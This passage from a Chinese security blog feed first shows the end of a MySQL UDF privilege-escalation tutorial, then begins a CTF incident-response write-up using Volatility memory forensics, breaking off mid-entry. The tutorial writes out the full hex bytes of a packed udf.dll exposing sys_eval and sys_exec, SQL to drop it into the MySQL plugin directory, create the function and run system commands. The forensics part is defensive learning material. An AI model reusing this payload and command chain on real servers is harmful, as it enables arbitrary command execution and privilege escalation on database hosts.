36c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283cd1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17cd556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">'B:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20140316.png" style="zoom:67%;"><p>方法三：创建临时表进行16进制数据写入</p><p>创建一张临时表用于存放dll/so文件的十六进制内容</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> temp_udf(udf <span class="type">BLOB</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li><strong><code>CREATE TABLE temp_udf</code></strong><ul><li>创建一个名为 <code>temp_udf</code> 的表（临时存储用户定义函数或其他二进制数据）。</li></ul></li><li><strong><code>udf BLOB</code></strong><ul><li>定义了一个列 <code>udf</code>，数据类型为 <strong>BLOB</strong>（Binary Large Object，二进制大对象），用于存储二进制数据（如图片、文件、序列化对象等）。</li><li>常见 BLOB 用途：<ul><li>存储文件内容（如 PDF、图片）。</li><li>保存序列化的程序数据（如 Python pickle 对象）。</li><li>记录加密后的数据</li></ul></li></ul></li></ol><p>通过16进制进行写入udf.dll文件</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> temp_udf <span class="keyword">values</span>( <span class="keyword">CONVERT</span>(<span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>,<span class="type">CHAR</span>));</span><br></pre></td></tr></tbody></table></figure><p>导出dll文件到指定目录</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> udf <span class="keyword">from</span> temp_udf <span class="keyword">INTO</span> DOWNFILE "B:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin";</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>创建自定义函数sys_eval</li></ol><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">'udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20140537.png" style="zoom:67%;"><p>然后使用命令查看是否新增了sys_eval函数</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20140854.png" style="zoom:67%;"><p>此处显示即为创建成功</p><ol start="4"><li>执行系统命令</li></ol><p>创建成功那么就可以使用自定义函数执行系统命令</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'ipconfig'</span>);</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20141055.png" style="zoom:67%;"><p>至此，提权成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Solar应急响应月赛-7月wp</title>
      <link href="/2025/07/26/solar-ying-ji-xiang-ying-yue-sai-7-yue-wp/"/>
      <url>/2025/07/26/solar-ying-ji-xiang-ying-yue-sai-7-yue-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Solar应急响应月赛-7月wp"><a href="#Solar应急响应月赛-7月wp" class="headerlink" title="Solar应急响应月赛-7月wp"></a>Solar应急响应月赛-7月wp</h1><p><strong>第一次尝试做内存取证，边学边做，花的时间有点长，排名也不怎么高，内容有不对的地方还望指正</strong>。</p><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a>一、 战队信息</h2><p><img src="https://pic1.imgdb.cn/item/6884a78658cb8da5c8e2059d.png"></p><h2 id="二、-解题情况"><a href="#二、-解题情况" class="headerlink" title="二、 解题情况"></a>二、 解题情况</h2><table><thead><tr><th align="center"><strong>题目名称</strong></th><th align="center"><strong>解出情况</strong></th></tr></thead><tbody><tr><td align="center"><strong>【任务1】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务2】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务3】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务4】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务5】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务6】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务7】VOL_EASY</strong></td><td align="center">未解出</td></tr><tr><td align="center"><strong>【任务8】VOL_EASY</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务1】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务2】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务3】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务4】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务5】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务6】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务7】应急大师</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务1】公交车系统攻击事件排查</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务2】公交车系统攻击事件排查</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务3】公交车系统攻击事件排查</strong></td><td align="center">解出</td></tr><tr><td align="center"><strong>【任务4】公交车系统攻击事件排查</strong></td><td align="center">未解出</td></tr><tr><td align="center"><strong>【任务5】公交车系统攻击事件排查</strong></td><td align="center">未解出</td></tr></tbody></table><h2 id="三、-解题过程"><a href="#三、-解题过程" class="headerlink" title="三、 解题过程"></a>三、 解题过程</h2><h3 id="取证专项"><a href="#取证专项" class="headerlink" title="取证专项"></a>取证专项</h3><p>首先使用imageinfo查看镜像信息</p><p><img src="https://pic1.imgdb.cn/item/688471d758cb8da5c8e14da1.png"></p><h4 id="【任务1】VOL-EASY"><a href="#【任务1】VOL-EASY" class="headerlink" title="【任务1】VOL_EASY"></a>【任务1】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客上传的一句话木马密码是多少？</p></blockquote><p>使用<code>iehistory</code>命令查看IE浏览器的历史记录，发现有一个ezshell.php文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 iehistory</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68849b4858cb8da5c8e1d8b8.png"></p><p>使用<code>filescan</code>以及<code>grep</code>命令，找到内存地址0x000000007ddf2280</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 filescan | grep "ezshell.php"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68849bb658cb8da5c8e1d91f.png"></p><p>使用<code>dumpfiles</code>根据内存地址导出文件到指定目录下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 dumpfiles -Q 0x000000007ddf2280 -D output/</span><br></pre></td></tr></tbody></table></figure><p>查看output目录下的文件</p><p><img src="https://pic1.imgdb.cn/item/68849c6058cb8da5c8e1dad1.png"></p><h4 id="【任务2】VOL-EASY"><a href="#【任务2】VOL-EASY" class="headerlink" title="【任务2】VOL_EASY"></a>【任务2】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客使用的木马连接工具叫什么（比如xx.exe）？(仅首字母大写)</p></blockquote><p>使用<code>pslist</code>查看进程，发现蚁剑的程序</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 pslist</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6884701758cb8da5c8e1485e.png"></p><h4 id="【任务3】VOL-EASY"><a href="#【任务3】VOL-EASY" class="headerlink" title="【任务3】VOL_EASY"></a>【任务3】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客使用的木马连接工具的位置在哪里（比如C:\xxxx\xx.exe） ？</p></blockquote><p>使用<code>dlllist -p &lt;PID&gt;</code>查看程序的位置</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 dlllist -p 1716</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/688470e858cb8da5c8e14ad2.png"></p><h4 id="【任务4】VOL-EASY"><a href="#【任务4】VOL-EASY" class="headerlink" title="【任务4】VOL_EASY"></a>【任务4】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客获取到的FLAG是什么？</p></blockquote><p>使用<code>yarascan</code>直接搜索flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 yarascan -Y "flag{"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6884712358cb8da5c8e14b90.png"></p><h4 id="【任务5】VOL-EASY"><a 